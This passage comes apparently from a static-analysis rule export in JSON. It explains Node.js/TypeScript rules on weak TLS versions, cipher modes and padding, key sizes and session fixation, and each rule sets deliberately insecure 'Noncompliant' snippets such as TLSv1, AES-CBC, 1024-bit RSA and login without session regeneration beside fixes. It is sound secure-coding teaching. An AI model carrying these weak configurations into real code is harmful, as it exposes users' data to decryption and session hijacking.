        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a\nhref=\"https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions\">these options</a> are used and are used in other third-party libraries as\nwell.</p>\n<p>The first is <code>secureProtocol</code>:</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n secureProtocol: 'TLSv1_method' // Noncompliant\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the\n<code>secureProtocol</code> option:</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  minVersion: 'TLSv1.1',  // Noncompliant\n  maxVersion: 'TLSv1.2'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>And <code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this\noption might trigger side effects and should be used carefully, if used at all.</p>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\nconst https     = require('node:https');\nconst tls       = require('node:tls');\nconst constants = require('node:crypto'):\n\nlet options = {\n  secureOptions:\n    constants.SSL_OP_NO_SSLv2\n    | constants.SSL_OP_NO_SSLv3\n    | constants.SSL_OP_NO_TLSv1\n}; // Noncompliant\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  minVersion: 'TLSv1.2',\n  maxVersion: 'TLSv1.2'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  secureOptions:\n    constants.SSL_OP_NO_SSLv2\n    | constants.SSL_OP_NO_SSLv3\n    | constants.SSL_OP_NO_TLSv1\n    | constants.SSL_OP_NO_TLSv1_1\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4787": {
        "name": "Encrypting data is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS4426'>S4426</a>, <a href='/coding_rules#rule_key=javascript%3AS5542'>S5542</a>, <a href='/coding_rules#rule_key=javascript%3AS5547'>S5547</a> instead.</p>\n<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Client side ===\ncrypto.subtle.encrypt(algo, key, plainData); // Sensitive\ncrypto.subtle.decrypt(algo, key, encData); // Sensitive\n</pre>\n<pre>\n// === Server side ===\nconst crypto = require(\"crypto\");\nconst cipher = crypto.createCipher(algo, key); // Sensitive\nconst cipheriv = crypto.createCipheriv(algo, key, iv); // Sensitive\nconst decipher = crypto.createDecipher(algo, key); // Sensitive\nconst decipheriv = crypto.createDecipheriv(algo, key, iv); // Sensitive\nconst pubEnc = crypto.publicEncrypt(key, buf); // Sensitive\nconst privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive\nconst privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive\nconst pubDec = crypto.publicDecrypt(key, privEnc); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/322\">CWE-322 - Key Exchange without Entity Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/324\">CWE-324 - Use of a Key Past its Expiration Date</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/325\">CWE-325 - Missing Required Cryptographic Step</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-128-CBC\", key, iv); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-256-GCM\", key, iv);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5876": {
        "name": "A new session should be created during user authentication",
        "htmlDesc": "<p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and\nimpersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>\n<h2>Why is this an issue?</h2>\n<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically\nworks:</p>\n<ul>\n  <li> When a user visits a website or logs in, a session is created for them. </li>\n  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,\n  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>\n  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the\n  attacker. </li>\n  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain\nunauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>\n<h4>Impersonation</h4>\n<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid\ncredentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing\nmalicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as\nrevealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>\n<h4>Data Breach</h4>\n<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include\npersonal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can\nbe used for identity theft, financial fraud, or other malicious purposes.</p>\n<h4>Privilege Escalation</h4>\n<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher\nprivileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized\nmodifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>\n<h2>How to fix it in Passport</h2>\n<h3>Code examples</h3>\n<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve\nthis by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user\nis assigned a new and unique session ID.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napp.post('/login',\n  passport.authenticate('local', { failureRedirect: '/login' }),\n  function(req, res) {\n    // Noncompliant - no session.regenerate after login\n    res.redirect('/');\n  });\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napp.post('/login',\n  passport.authenticate('local', { failureRedirect: '/login' }),\n  function(req, res) {\n    let prevSession = req.session;\n    req.session.regenerate((err) =&gt; {\n      Object.assign(req.session, prevSession);\n      res.redirect('/');\n    });\n  });\n</pre>\n<h3>How does this work?</h3>\n<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated\nduring the authentication process.</p>\n<p>Here’s how session fixation protection typically works:</p>\n<ol>\n  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored\n  in a cookie or passed through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows\n  the attacker to potentially gain unauthorized access to the user’s session. </li>\n  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a\n  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>\n  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.\n  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>\n  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier\n  is typically stored in a new session cookie or passed through URL parameters. </li>\n</ol>\n<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,\nsecure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s\nsession and helps maintain the integrity and security of the application’s session management process.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Express.js Documentation - <a href=\"http://expressjs.com/en/resources/middleware/session.html\">express-session</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d\">Fixing Session Fixation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 1024,  // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {\n    modulusLength: 1024,  // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPair('ec', {\n    namedCurve: 'secp112r2', // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<h4>Compliant solution</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 2048,\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {\n    modulusLength: 2048,\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated 